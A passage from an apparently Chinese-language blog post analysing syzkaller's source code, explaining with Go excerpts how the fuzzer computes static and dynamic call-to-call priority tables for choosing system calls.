apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>那么在 <code>run</code> 表中则会将一列的结果逐个加起来，从而有这样的一个结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>为什么要这么做笔者也不知道：(</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := target.CalculatePriorities(corpus)<br>run := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-comment">// ChoiceTable.runs[][] 包含对加权优先级数字的累加总和.</span><br><span class="hljs-comment">// 这在生成程序时有助于带权快速二叉搜索.</span><br><span class="hljs-comment">// 这仅用于在目标上所启用的系统调用.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> run &#123;<br><span class="hljs-keyword">if</span> !enabled[target.Syscalls[i]] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>run[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">var</span> sum <span class="hljs-type">int32</span><br><span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> run[i] &#123;<br><span class="hljs-keyword">if</span> enabled[target.Syscalls[j]] &#123;<br>sum += prios[i][j]<br>&#125;<br>run[i][j] = sum<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> &amp;ChoiceTable&#123;target, run, generatableCalls, noGenerateCalls&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】target-CalculatePriorities-corpus-：计算-call-to-call-的权重表"><a href="#【核心】target-CalculatePriorities-corpus-：计算-call-to-call-的权重表" class="headerlink" title="【核心】target.CalculatePriorities(corpus)：计算 call-to-call 的权重表"></a>【核心】target.CalculatePriorities(corpus)：计算 call-to-call 的权重表</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>CalculatePriorities(corpus)</code> 为系统调用生成优先级表的核心计算过程，代码其实比较简单（不过注释很长），主要分为<strong>静态优先级</strong>与<strong>动态优先级</strong>两部分进行计算，默认进行静态优先级的计算，若语料库不为空则再计算动态优先级：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 计算 call-to-call 的优先级.</span><br><span class="hljs-comment">// 对于一对给定的调用 X 与 Y, 优先级便是我们对于</span><br><span class="hljs-comment">// 将一个额外的调用 Y 添加到一个包含有调用 X 的程序当中</span><br><span class="hljs-comment">// 是否有可能给出新的覆盖率的猜测.</span><br><span class="hljs-comment">// 当前的算法有两个部分：静态与动态.</span><br><span class="hljs-comment">// 静态部分基于对参数类型的分析. 举个🌰,</span><br><span class="hljs-comment">// 若调用 X 与 Y 都接受 fd[sock], 则他们更有可能一起给出新的覆盖率.</span><br><span class="hljs-comment">// 动态部分则基于语料库中一对特定的系统调用在一个程序中出现的频率.</span><br><span class="hljs-comment">// 例如，若 socket 与 connect 频繁地在一个程序中一起出现，</span><br><span class="hljs-comment">// 我们给这对系统调用更高的优先级.</span><br><span class="hljs-comment">// 注意: 当前的实现非常简陋, 任何常量背后都没有理论支持.</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> CalculatePriorities(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>static := target.calcStaticPriorities()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(corpus) != <span class="hljs-number">0</span> &#123;<br>dynamic := target.calcDynamicPrio(corpus)<br><span class="hljs-keyword">for</span> i, prios := <span class="hljs-keyword">range</span> dynamic &#123;<br>dst := static[i]<br><span class="hljs-keyword">for</span> j, p := <span class="hljs-keyword">range</span> prios &#123;<br>dst[j] = dst[j] * p / prioHigh<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> static<br>&#125;<br></code></pre></td></tr></table></figure><p>对于给定的系统调用 X，添加系统调用 Y 的优先级为：<br>$$<br>最终优先级 &#x3D; 静态优先级 * 动态优先级 &#x2F; prioHigh<br>$$<br> 其中 <code>prioHigh</code> 为一个常量 <code>1000</code></p><h4 id="①-calcStaticPriorities-：静态优先级计算"><a href="#①-calcStaticPriorities-：静态优先级计算" class="headerlink" title="① calcStaticPriorities()：静态优先级计算"></a>① calcStaticPriorities()：静态优先级计算</h4><h5 id="Step-I-计算资源使用情况"><a href="#Step-I-计算资源使用情况" class="headerlink" title="Step.I - 计算资源使用情况"></a>Step.I - 计算资源使用情况</h5><blockquote><p>注：这里的【资源】更严谨地说应该是 syzlang 中的 <a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#VI-%E8%B5%84%E6%BA%90%EF%BC%88resources%EF%BC%89">resource</a></p></blockquote><p><code>calcStaticPriorities()</code> 用以完成静态优先级的计算，该函数首先会调用 <code>calcResourceUsage()</code> 获取当前的【资源使用情况】：</p><ul><li>该函数的返回结果为一个二重映射 <code>资源名（string）→【系统调用号（int）→权重（weights）】</code> </li><li>该函数的核心逻辑便是调用 <code>ForeachType()</code> 进行分析</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcStaticPriorities() [][]<span class="hljs-type">int32</span> &#123;<br>uses := target.calcResourceUsage()<br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcResourceUsage() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights &#123;<br>uses := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>ForeachType(target.Syscalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> uses<br>&#125;<br></code></pre></td></tr></table></figure><p>我们稍后再来分析传入的闭包函数，我们首先分析 <code>ForeachType()</code> ，其会遍历系统调用表并调用 <code>foreachTypeImpl()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachTypePost</span><span class="hljs-params">(syscalls []*Syscall, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-keyword">for</span> _, meta := <span class="hljs-keyword">range</span> syscalls &#123;<br>foreachTypeImpl(meta, <span class="hljs-literal">false</span>, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>foreachTypeImpl()</code>  用以处理单个系统调用，其首先会创建一个 <code>类型→bool</code> 的映射 <code>seen</code>，接下来会创建一个闭包函数 <code>rec</code> ，该函数会根据传入类型的不同进行不同操作：</p><blockquote><p>注：这里的类型应当为 syzlang 中的类型</p></blockquote><ul><li>若是指针类型 （<code>PtrType</code> ），则递归调用  <code>rec</code> </li><li>若是数组类型（<code>ArrayType</code> ），则递归调用 <code>rec</code></li><li>若是结构体类型（<code>StructType</code>）且不在 <code>seen</code> 中，将其添加到 <code>seen</code> 中，并为每一个结构体成员调用 <code>rec</code> </li><li>若是联合类型（<code>UnionType</code>）且不在 <code>seen</code> 中，将其添加到 <code>seen</code> 中，并为每一个联合成员调用 <code>rec</code> </li><li>其他合法类型则直接跳过，非法类型（syzlang 编译期错误）则 panic</li><li>最后调用上层传入的闭包函数（我们在 <code>ForeachTypePost()</code> 中传入 <code>preorder = false</code>）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachTypeImpl</span><span class="hljs-params">(meta *Syscall, preorder <span class="hljs-type">bool</span>, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-comment">// 注意: 我们特意不在 ForeachType 中创建 seen..</span><br><span class="hljs-comment">// 其能更好地对递归进行剪枝 (在系统调用间), 但大量的使用者需要</span><br><span class="hljs-comment">// 对单个系统调用访问每个结构体 (例如 prio, used resources).</span><br>seen := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[Type]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> rec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Type, Dir)</span></span><br>rec = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ptr *Type, dir Dir)</span></span> &#123;<br>ctx := &amp;TypeCtx&#123;Meta: meta, Dir: dir, Ptr: ptr&#125;<br><span class="hljs-keyword">if</span> preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> a := (*ptr).(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *PtrType:<br>rec(&amp;a.Elem, a.ElemDir)<br><span class="hljs-keyword">case</span> *ArrayType:<br>rec(&amp;a.Elem, dir)<br><span class="hljs-keyword">case</span> *StructType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// 通过对structs/unions的指针来剪枝掉递归</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *UnionType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// 通过对structs/unions的指针来剪枝掉递归</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *ResourceType, *BufferType, *VmaType, *LenType, *FlagsType,<br>*ConstType, *IntType, *ProcType, *CsumType:<br><span class="hljs-keyword">case</span> Ref:<br><span class="hljs-comment">// 仅 pkg/compiler 需要.</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown type&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> !preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;Stop is set in post-order iteration&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>foreachTypeImpl()</code> 实际上便是为传入的系统调用的每个参数都调用 <code>rec()</code>，若存在返回值也为其调用 <code>rec</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> meta.Args &#123;<br>rec(&amp;meta.Args[i].Type, DirIn)<br>&#125;<br><span class="hljs-keyword">if</span> meta.Ret != <span class="hljs-literal">nil</span> &#123;<br>rec(&amp;meta.Ret, DirOut)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们回到 <code>calcResourceUsage()</code> 看其传给 <code>ForeachType()</code> 的闭包函数，也是根据系统调用的参数的类型不同进行处理：</p><blockquote><p>这里的 <code>a</code> 为 Type 接口， a.Desc 为 ResourceDesc类型，即对一个资源的描述，其 Kind 域为一个 string 数组，Values 域为一个 uint64 数组</p></blockquote><ul><li><p>若是资源类型 （<code>ResourceType</code> ）：</p><ul><li>若在 <code>AuxResources</code> 表（辅助资源表，即扮演着辅助角色但是在所有系统调用中都会用到的资源（例如uid&#x2F;gid））里已有记录，则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 1</li><li>否则，遍历 <code>a.Desc.Kind</code> ，调用 <code>noteUsage()</code> 更新权重值，这里给除了最后一个 Kind 以外的权重值为 2，最后一个为 10</li></ul></li><li><p>若是指针类型（<code>PttrType</code>），则判断指针所指对象类型（结构体&#x2F;联合体&#x2F;数组）并调用 <code>noteUsage()</code> 更新权重值，这里给的权重值都为 10</p></li><li><p>若是 buffer 类型（<code>BufferType</code>），则根据 <code>a.Kind</code> 进行不同处理：</p><ul><li><code>BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed</code> ：无处理</li><li><code>BufferString, BufferGlob</code> ：若 <code>a.SubKind != &quot;&quot;</code>，则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 2</li><li><code>BufferFilename</code>：调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 10</li></ul></li><li><p>若为 VMA 类型 （<code>VmaType</code>），则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 5</p></li><li><p>对于整型则检查 <code>a.Kind</code> 是否为 <code>IntPlain, IntRange</code>，若不是则直接 panic</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br>c := ctx.Meta<br><span class="hljs-keyword">switch</span> a := t.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ResourceType:<br><span class="hljs-keyword">if</span> target.AuxResources[a.Desc.Name] &#123;<br>noteUsage(uses, c, <span class="hljs-number">1</span>, ctx.Dir, <span class="hljs-string">&quot;res%v&quot;</span>, a.Desc.Name)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>str := <span class="hljs-string">&quot;res&quot;</span><br><span class="hljs-keyword">for</span> i, k := <span class="hljs-keyword">range</span> a.Desc.Kind &#123;<br>str += <span class="hljs-string">&quot;-&quot;</span> + k<br>w := <span class="hljs-type">int32</span>(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-built_in">len</span>(a.Desc.Kind)<span class="hljs-number">-1</span> &#123;<br>w = <span class="hljs-number">2</span><br>&#125;<br>noteUsage(uses, c, w, ctx.Dir, str)<br>&#125;<br>&#125;<br><span class="hljs-keyword">case</span> *PtrType:<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*StructType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*UnionType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> arr, ok := a.Elem.(*ArrayType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, arr.Elem.Name())<br>&#125;<br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed:<br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> a.SubKind != <span class="hljs-string">&quot;&quot;</span> &#123;<br>noteUsage(uses, c, <span class="hljs-number">2</span>, ctx.Dir, fmt.Sprintf(<span class="hljs-string">&quot;str-%v&quot;</span>, a.SubKind))<br>&#125;<br><span class="hljs-keyword">case</span> BufferFilename:<br>noteUsage(uses, c, <span class="hljs-number">10</span>, DirIn, <span class="hljs-string">&quot;filename&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown buffer kind&quot;</span>)<br>&#125;<br><span class="hljs-keyword">case</span> *VmaType:<br>noteUsage(uses, c, <span class="hljs-number">5</span>, ctx.Dir, <span class="hljs-string">&quot;vma&quot;</span>)<br><span class="hljs-keyword">case</span> *IntType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> IntPlain, IntRange:<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown int kind&quot;</span>)<br>&#125;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>这里大量用到了 <code>noteUsage()</code> 函数，该函数其实就是用来<strong>更新传入的表中 X 到 Y 的权重值</strong>（取最大值）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">noteUsage</span><span class="hljs-params">(uses <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights, c *Syscall, weight <span class="hljs-type">int32</span>, dir Dir, str <span class="hljs-type">string</span>, args ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>id := fmt.Sprintf(str, args...)<br><span class="hljs-keyword">if</span> uses[id] == <span class="hljs-literal">nil</span> &#123;<br>uses[id] = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>&#125;<br>callWeight := uses[id][c.ID]<br>callWeight.call = c.ID<br><span class="hljs-keyword">if</span> dir != DirOut &#123;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].in &#123;<br>callWeight.in = weight<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].inout &#123;<br>callWeight.inout = weight<br>&#125;<br>uses[id][c.ID] = callWeight<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Step-II-建立-call-to-call-的权重表"><a href="#Step-II-建立-call-to-call-的权重表" class="headerlink" title="Step.II - 建立 call-to-call 的权重表"></a>Step.II - 建立 call-to-call 的权重表</h5><p>现在我们回到 <code>calcStaticPriorities()</code> 中，在完成了资源使用表 <code>uses</code> 的建立之后，接下来会建立 call-to-call 的权重表 <code>prios</code>：</p><ul><li>遍历资源使用表中的每个权重，基于参数方向赋予静态权重值（例如，当 c0 为创建了一个资源的调用，而 c1 为使用该资源的调用，则一个更高的权重将被赋予）</li><li>调用 <code>normalizePrio()</code> 将表中权重值进行标准化</li><li>对于自我系统调用权重进行单独赋值</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, weights := <span class="hljs-keyword">range</span> uses &#123;<br><span class="hljs-keyword">for</span> _, w0 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">for</span> _, w1 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">if</span> w0.call == w1.call &#123;<br><span class="hljs-comment">// 自身权重在下方赋值.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 静态权重值基于参数方向赋值.当 c0 为创建了一个资源的调用</span><br><span class="hljs-comment">// 而 c1 为使用该资源的调用，则一个更高的权重将被赋予.</span><br>prios[w0.call][w1.call] += w0.inout*w1.in*<span class="hljs-number">3</span>/<span class="hljs-number">2</span> + w0.inout*w1.inout<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-comment">// 自身权重值(call wrt itself) 的赋值应当高些, 但不要太高.</span><br><span class="hljs-keyword">for</span> c0, pp := <span class="hljs-keyword">range</span> prios &#123;<br>pp[c0] = prioHigh * <span class="hljs-number">9</span> / <span class="hljs-number">10</span><br>&#125;<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><p>完成基于资源使用的权重值计算之后静态优先级就算计算完毕了：）</p><h4 id="②-calcDynamicPrio-：动态优先级计算"><a href="#②-calcDynamicPrio-：动态优先级计算" class="headerlink" title="② calcDynamicPrio()：动态优先级计算"></a>② calcDynamicPrio()：动态优先级计算</h4><p>动态优先级的计算基于现有的语料库完成，这一部分的代码比较简单，主要是遍历语料库，对于同时出现的系统调用对 X、Y 的优先级值 <code>+1</code>，完成后调用 <code>normalizePrio()</code> 进行标准化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcDynamicPrio(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> idx0, c0 := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">for</span> _, c1 := <span class="hljs-keyword">range</span> p.Calls[idx0+<span class="hljs-number">1</span>:] &#123;<br>prios[c0.Meta.ID][c1.Meta.ID]++<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="③-normalizePrio-：优先级值标准化"><a href="#③-normalizePrio-：优先级值标准化" class="headerlink" title="③ normalizePrio()：优先级值标准化"></a>③ normalizePrio()：优先级值标准化</h4><p>这个函数逻辑比较简单，主要就是将权重值标准化到 [prioLow..prioHigh] 范围：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>prioLow  = <span class="hljs-number">10</span><br>prioHigh = <span class="hljs-number">1000</span><br>)<br><br><span class="hljs-comment">// normalizePrio 将权重值标准化到 [prioLow..prioHigh] 范围.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">normalizePrio</span><span class="hljs-params">(prios [][]<span class="hljs-type">int32</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> _, prio := <span class="hljs-keyword">range</span> prios &#123;<br>max := <span class="hljs-type">int32</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> prio &#123;<br><span class="hljs-keyword">if</span> max &lt; p &#123;<br>max = p<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> i, p := <span class="hljs-keyword">range</span> prio &#123;<br>prio[i] = prioLow + p*(prioHigh-prioLow)/max<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="为每个-syz-executor-启动一个协程，正式开始-fuzz"><a 